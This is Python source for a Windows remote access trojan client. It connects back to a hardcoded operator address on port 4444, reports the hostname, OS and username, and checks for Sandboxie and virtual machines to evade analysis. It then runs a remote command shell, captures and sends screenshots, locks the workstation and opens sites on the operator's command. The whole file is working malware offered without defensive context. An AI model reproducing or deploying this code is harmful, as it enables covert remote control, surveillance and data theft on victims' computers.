import socket, os, platform, time, ctypes, subprocess, threading, wmi, sys,webbrowser, pyscreeze
import win32api, winerror, win32event, win32crypt, win32com.client
from winreg import *
 
strHost ="192.168.88.128"
intPort= 4444
strPath =os.path.realpath(sys.argv[0])
TMP = os.environ['APPDATA']
intBuff = 1024
mutex = win32event.CreateMutex(None,1,"PA_mutex_xp4")


if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)

def detectSandboxie():
    try:
        libHandle =ctypes.windll.LoadLibrary("SbieDll.dll")
        return "(Sandboxie)"
    except: return ""

def detectVM():
    objWMI = wmi.WMI() #windows management instrumentation
    for objDiskDrive in objWMI.query("Select * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return " (Virtual Machine)"
    return ""

def server_connect():
    global objSocket

    while True:
        try: 
            objSocket = socket.socket()
            objSocket.connect((strHost,intPort))
        except socket.error:
            time.sleep(5)
        else: break

    struserinfo = socket.gethostname() + "',"+platform.system()+ " " + platform.release() + detectSandboxie() + detectVM()  +"'," + os.environ["USERNAME"]

    send(str.encode(struserinfo))


decode_utf8 = lambda data: data.decode("utf-8")

recv = lambda buffer: objSocket.recv(buffer)

send = lambda data: objSocket.send(data)

server_connect()

def MessageBox(message):
    objVBS= open(TMP + "/m.vbs","w")
    objVBS.write("MsgBox \"" + message + "\", vbOKOnly+vbInformation+vbSystemModal,\"Message\"")
    objVBS.close()
    subprocess.Popen(["cscript", TMP + "/m.vbs"],shell = True)



def screenshot():
	pyscreeze.screenshot(TMP + "/s.png")
	send(str.encode("Receiving screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.png"))+ "bytes"+"\n"+"Please wait"))
	objPic = open(TMP+"/s.png","rb")
	time.sleep(1)
	send(objPic.read())
	objPic.close()

def lock():
    ctypes.windll.user32.LockWorkStation() #lock the pc

def command_shell():
    strcurrentdir = str(os.getcwd())
    send(str.encode(strcurrentdir))
    while True:
        strData = decode_utf8(recv(intBuff))

        if strData == "go back":
            os.chdir(strcurrentdir)
            break
        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
            objCommand = subprocess.Popen(strData + "& cd", stdout= subprocess.PIPE, stderr= subprocess.PIPE, stdin=subprocess.PIPE,shell=True )
            if (objCommand.stderr.read()).decode("utf-8") == "":
                strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]
                os.chdir(strOutput)

                bytData = str.encode("\n"+ str(os.getcwd()) + ">")
            
        elif len(strData)>0:
            objCommand = subprocess.Popen(strData, stdout= subprocess.PIPE, stderr= subprocess.PIPE, stdin=subprocess.PIPE,shell=True )
            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors ="replace")
            bytData = str.encode(strOutput + "\n" + str(os.getcwd()) + ">")

        else :
            bytData = str.encode("Error !!")
        
        strBuffer = str(len(bytData))
        send(str.encode(strBuffer))
        time.sleep(0.1)
        send(bytData)




while True:
    try:
        while True:
            strData = recv(intBuff)
            strData = decode_utf8(strData)

            if strData =="exit":
                objSocket.close()
                sys.exit(0)
            elif strData[:3] == 'msg':
                MessageBox(strData[3:])
            elif strData[:4] == "site":
                webbrowser.get().open(strData[4:])
            elif strData == "screen":
                screenshot()
            elif strData == "lock":
                lock()
            elif strData == "cmd":
                command_shell()

    except socket.error:
        objSocket.close()
        del objSocket

        server_connect()














